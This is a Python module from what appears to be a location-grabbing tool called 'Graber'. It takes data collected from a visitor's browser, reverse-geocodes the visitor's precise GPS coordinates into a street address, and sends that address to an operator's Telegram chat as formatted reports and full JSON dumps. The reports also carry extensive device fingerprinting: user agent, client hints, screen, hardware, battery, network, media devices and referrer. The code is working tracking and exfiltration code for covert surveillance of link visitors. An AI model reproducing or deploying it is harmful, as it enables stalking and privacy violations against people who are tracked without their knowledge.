"""Общая логика отчёта: геокодинг и Telegram (локальный server.py и Vercel api/report)."""

from __future__ import annotations

import html
import json
import time
import urllib.error
import urllib.parse
import urllib.request

NOMINATIM_UA = "GraberLocation/1.0 (contact via repo)"


def normalize_telegram_token(raw: str) -> str:
    """Убирает пробелы/BOM/невидимые символы; вытаскивает токен из случайно вставленного URL."""
    t = (raw or "").strip().strip("\ufeff")
    for z in ("\u200b", "\u200c", "\u200d", "\ufeff"):
        t = t.replace(z, "")
    t = t.strip()
    if "api.telegram.org" in t and "/bot" in t:
        try:
            after = t.split("/bot", 1)[1]
            t = after.split("/", 1)[0].split("?", 1)[0]
        except IndexError:
            pass
    if len(t) >= 2 and t[0] == t[-1] and t[0] in "\"'":
        t = t[1:-1].strip()
    return t


def normalize_telegram_chat_id(raw: str) -> str:
    s = (raw or "").strip().strip("\ufeff")
    for z in ("\u200b", "\u200c", "\u200d", "\ufeff"):
        s = s.replace(z, "")
    return s.strip()


def reverse_geocode(lat: float, lon: float) -> str | None:
    q = urllib.parse.urlencode(
        {"lat": lat, "lon": lon, "format": "json", "accept-language": "ru"}
    )
    url = f"https://nominatim.openstreetmap.org/reverse?{q}"
    req = urllib.request.Request(url, headers={"User-Agent": NOMINATIM_UA})
    try:
        with urllib.request.urlopen(req, timeout=12) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="replace"))
        return data.get("display_name")
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, OSError):
        return None


def telegram_send_message(
    token: str, chat_id: str, text: str, *, parse_mode: str | None = None
) -> None:
    token = normalize_telegram_token(token)
    chat_id = normalize_telegram_chat_id(chat_id)
    if not token or ":" not in token:
        raise RuntimeError(
            "TELEGRAM_BOT_TOKEN пустой или неверного формата (нужен вид 123456789:AAH… из @BotFather)."
        )
    if not chat_id:
        raise RuntimeError("TELEGRAM_CHAT_ID пустой.")

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    msg: dict = {
        "chat_id": chat_id,
        "text": text,
        "disable_web_page_preview": True,
    }
    if parse_mode:
        msg["parse_mode"] = parse_mode
    body = json.dumps(msg).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/json; charset=utf-8"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        err_body = ""
        try:
            err_body = e.read().decode("utf-8", errors="replace")[:400]
        except OSError:
            pass
        # Telegram отдаёт 404 для неверного/отозванного токена (не путать с «чат не найден»).
        if e.code == 404:
            raise RuntimeError(
                "Telegram: неверный или отозванный TELEGRAM_BOT_TOKEN (ответ API 404). "
                "Выпустите новый токен в @BotFather → /revoke или новый бот, "
                "обновите переменную в Vercel → Settings → Environment Variables (Production) и сделайте Redeploy."
            ) from e
        raise RuntimeError(
            f"Telegram API HTTP {e.code}: {err_body or e.reason}"
        ) from e
    data = json.loads(raw)
    if not data.get("ok"):
        raise RuntimeError(raw[:500])


def _esc(x) -> str:
    if x is None:
        return "—"
    if isinstance(x, bool):
        return "да" if x else "нет"
    return html.escape(str(x), quote=False)


def _kv(label: str, value) -> str:
    return f"• <b>{_esc(label)}</b>: <code>{_esc(value)}</code>"


def _section(title: str) -> str:
    return f"<b>━━ {_esc(title)} ━━</b>"


def _json_pre(obj, max_len: int = 1200) -> str:
    try:
        s = json.dumps(obj, ensure_ascii=False, indent=1, default=str)
    except TypeError:
        s = str(obj)
    if len(s) > max_len:
        s = s[: max_len - 1] + "…"
    return f"<pre>{_esc(s)}</pre>"


def _join_html_parts(parts: list[str], max_len: int = 4096) -> str:
    """Собирает HTML без разрыва внутри кусков (каждый кусок — целые <pre>/<code>/строки)."""
    footer = (
        "\n\n<i>Часть разделов убрана по лимиту Telegram; полные данные — в следующем "
        "сообщении (JSON).</i>"
    )
    full = "\n".join(parts)
    if len(full) <= max_len:
        return full
    budget = max_len - len(footer) - 4
    chosen: list[str] = []
    n = 0
    for p in parts:
        extra = len(p) + (1 if chosen else 0)
        if n + extra > budget:
            break
        chosen.append(p)
        n += extra
    if not chosen:
        return (
            "<b>📍 Отчёт Graber</b>\n"
            "<i>Объём данных превышает лимит одного сообщения; смотрите JSON ниже.</i>"
        )
    return "\n".join(chosen) + footer


def format_report_html(payload: dict, address: str | None) -> str:
    """Структурированное сообщение для Telegram (parse_mode=HTML)."""
    g = payload.get("geolocation") or {}
    env = payload.get("env") or {}
    parts: list[str] = []

    parts.append("<b>📍 Отчёт Graber</b>")
    parts.append(_kv("Время сбора (ISO, клиент)", payload.get("collectedAt")))
    parts.append("")

    parts.append(_section("Геолокация (WGS-84, браузер)"))
    parts.append(_kv("Широта (°)", g.get("latitude")))
    parts.append(_kv("Долгота (°)", g.get("longitude")))
    parts.append(_kv("Точность горизонтали (м, ~68%)", g.get("accuracyM")))
    parts.append(_kv("Высота (м, WGS-84)", g.get("altitude")))
    parts.append(_kv("Точность высоты (м)", g.get("altitudeAccuracyM")))
    parts.append(_kv("Курс / азимут (°)", g.get("heading")))
    parts.append(_kv("Скорость (м/с)", g.get("speed")))
    parts.append(_kv("Время фиксации (epoch ms)", g.get("timestamp")))
    parts.append(
        _kv(
            "Способ фиксации (подсказка клиента)",
            g.get("fixHint") or "—",
        )
    )
    parts.append("")

    parts.append(_section("Адрес (обратное геокодирование, Nominatim OSM)"))
    parts.append(_esc(address or "не удалось получить (сеть/OSM)"))
    parts.append("")

    parts.append(_section("Страница и переход"))
    parts.append(_kv("Полный URL страницы", env.get("pageUrl")))
    parts.append(_kv("HTTP Referrer (откуда пришли)", env.get("referrer") or "—"))
    parts.append(_kv("Состояние вкладки", env.get("visibilityState")))
    parts.append("")

    parts.append(_section("Браузер и движок"))
    parts.append(_kv("User-Agent (строка)", (env.get("userAgent") or "")[:900] or "—"))
    parts.append(_kv("navigator.platform", env.get("platform")))
    parts.append(_kv("navigator.vendor", env.get("vendor")))
    parts.append(_kv("navigator.product", env.get("product")))
    parts.append(_kv("Онлайн (navigator.onLine)", env.get("onLine")))
    parts.append(_kv("Cookies включены", env.get("cookieEnabled")))
    parts.append(_kv("Do Not Track", env.get("doNotTrack") or "—"))
    parts.append(_kv("Встроенный просмотр PDF", env.get("pdfViewerEnabled")))
    parts.append(_kv("WebDriver (признак автоматизации)", env.get("webdriver")))
    parts.append("")

    parts.append(_section("Языки и время"))
    parts.append(_kv("Язык интерфейса (основной)", env.get("language")))
    langs = env.get("languages")
    if isinstance(langs, list):
        parts.append(_kv("Список языков", ", ".join(str(x) for x in langs)))
    parts.append(_kv("Часовой пояс (IANA)", env.get("timezone")))
    parts.append(_kv("Смещение от UTC (мин, −getTimezoneOffset)", env.get("timezoneOffsetMin")))
    intl = env.get("intl")
    if isinstance(intl, dict) and intl:
        parts.append("• <b>Intl (resolvedOptions)</b>")
        parts.append(_json_pre(intl, 600))
    parts.append("")

    parts.append(_section("Экран и окно"))
    parts.append(_kv("Экран: ширина×высота (px)", _fmt_wh(env.get("screen"))))
    parts.append(_kv("Экран: доступная область (px)", _fmt_avail(env.get("screen"))))
    parts.append(_kv("Глубина цвета / пиксель (bit)", env.get("screenColorDepth")))
    parts.append(_kv("Ориентация экрана", _deep_get(env, "screen", "orientation")))
    parts.append(_kv("Viewport внутри окна (px)", _fmt_vp(env.get("viewport"))))
    parts.append(_kv("devicePixelRatio", _deep_get(env, "viewport", "devicePixelRatio")))
    parts.append(_kv("Внешний размер окна (px)", _fmt_outer(env.get("windowOuter"))))
    parts.append("")

    parts.append(_section("Железо (оценки браузера)"))
    parts.append(_kv("Логических ядер CPU", env.get("hardwareConcurrency")))
    parts.append(_kv("deviceMemory (ГБ, если доступно)", env.get("deviceMemory")))
    parts.append(_kv("Макс. одновременных касаний", env.get("maxTouchPoints")))
    pm = env.get("performanceMemory")
    if isinstance(pm, dict) and pm:
        parts.append("• <b>Память JS (Chrome performance.memory)</b>")
        parts.append(_json_pre(pm, 500))
    parts.append("")

    parts.append(_section("Сеть (Network Information API)"))
    net = env.get("network")
    if isinstance(net, dict) and net:
        parts.append(_kv("Тип соединения (type)", net.get("type") or "—"))
        parts.append(_kv("Эффективный тип (2g/3g/4g…)", net.get("effectiveType")))
        parts.append(_kv("Скорость downlink (Мбит/с)", net.get("downlink")))
        parts.append(_kv("RTT (мс)", net.get("rtt")))
        parts.append(_kv("Режим экономии трафика", net.get("saveData")))
    else:
        parts.append("• данные Network Information API недоступны")
    parts.append("")

    parts.append(_section("Оформление и медиа"))
    parts.append(_kv("prefers-color-scheme", env.get("prefersColorScheme")))
    parts.append(_kv("prefers-reduced-motion", env.get("prefersReducedMotion")))
    md = env.get("mediaDevices")
    if isinstance(md, dict) and md:
        parts.append("• <b>Медиа-устройства (enumerateDevices)</b>")
        parts.append(_json_pre(md, 800))
    parts.append("")

    parts.append(_section("Питание и хранилище"))
    bat = env.get("battery")
    if isinstance(bat, dict) and bat:
        lvl = bat.get("level")
        if isinstance(lvl, (int, float)):
            parts.append(_kv("Батарея, уровень", f"{round(float(lvl) * 100)}%"))
        parts.append(_kv("Батарея, зарядка", bat.get("charging")))
        parts.append(_kv("chargingTime (с)", bat.get("chargingTime")))
        parts.append(_kv("dischargingTime (с)", bat.get("dischargingTime")))
    else:
        parts.append("• API батареи недоступен или запрещён")
    st = env.get("storage")
    if isinstance(st, dict) and st:
        parts.append("• <b>Storage.estimate()</b>")
        parts.append(_json_pre(st, 400))
    else:
        parts.append("• Storage.estimate недоступен")
    parts.append("")

    parts.append(_section("User-Agent Client Hints (высокая энтропия)"))
    uch = env.get("uaClientHints")
    if isinstance(uch, dict) and uch:
        parts.append(_json_pre(uch, 1500))
    else:
        parts.append("• не поддерживается или отклонено браузером")
    parts.append("")

    parts.append(_section("Хост и путь (location)"))
    loc = env.get("locationBar")
    if isinstance(loc, dict) and loc:
        parts.append(_json_pre(loc, 400))
    parts.append("")

    used_env_keys = {
        "userAgent",
        "platform",
        "vendor",
        "product",
        "onLine",
        "cookieEnabled",
        "doNotTrack",
        "pdfViewerEnabled",
        "webdriver",
        "language",
        "languages",
        "timezone",
        "timezoneOffsetMin",
        "intl",
        "screen",
        "viewport",
        "windowOuter",
        "screenColorDepth",
        "network",
        "hardwareConcurrency",
        "deviceMemory",
        "maxTouchPoints",
        "performanceMemory",
        "prefersColorScheme",
        "prefersReducedMotion",
        "mediaDevices",
        "battery",
        "storage",
        "uaClientHints",
        "locationBar",
        "pageUrl",
        "referrer",
        "visibilityState",
    }
    rest = {k: v for k, v in env.items() if k not in used_env_keys and v not in (None, "", [], {})}
    if rest:
        parts.append(_section("Прочие поля env"))
        parts.append(_json_pre(rest, 2000))

    return _join_html_parts(parts, max_len=4000)


def _deep_get(d: dict, k1: str, k2: str):
    if not isinstance(d, dict):
        return None
    x = d.get(k1)
    if isinstance(x, dict):
        return x.get(k2)
    return None


def _fmt_wh(screen: dict | None) -> str:
    if not isinstance(screen, dict):
        return "—"
    return f"{screen.get('width')} × {screen.get('height')}"


def _fmt_avail(screen: dict | None) -> str:
    if not isinstance(screen, dict):
        return "—"
    return f"{screen.get('availWidth')} × {screen.get('availHeight')}"


def _fmt_vp(vp: dict | None) -> str:
    if not isinstance(vp, dict):
        return "—"
    return f"{vp.get('innerWidth')} × {vp.get('innerHeight')}"


def _fmt_outer(wo: dict | None) -> str:
    if not isinstance(wo, dict):
        return "—"
    return f"{wo.get('outerWidth')} × {wo.get('outerHeight')}"


def send_telegram_report(
    token: str, chat_id: str, payload: dict, address: str | None
) -> None:
    """Отправляет структурированный HTML-отчёт и полный JSON (plain) частями."""
    main = format_report_html(payload, address)
    telegram_send_message(token, chat_id, main, parse_mode="HTML")
    time.sleep(0.25)
    raw = json.dumps(payload, ensure_ascii=False, indent=2, default=str)
    max_plain = 4090
    max_chunks = 4
    if len(raw) <= max_plain:
        telegram_send_message(
            token,
            chat_id,
            "📎 Полный снимок данных (JSON):\n" + raw,
            parse_mode=None,
        )
        return
    for i in range(max_chunks):
        chunk = raw[i * max_plain : (i + 1) * max_plain]
        if not chunk:
            break
        telegram_send_message(
            token,
            chat_id,
            f"📎 JSON (часть {i + 1}/{max_chunks}):\n{chunk}",
            parse_mode=None,
        )
        time.sleep(0.3)
    if len(raw) > max_plain * max_chunks:
        telegram_send_message(
            token,
            chat_id,
            "⚠️ JSON обрезан по лимиту отправки; на клиенте собрано больше данных.",
            parse_mode=None,
        )
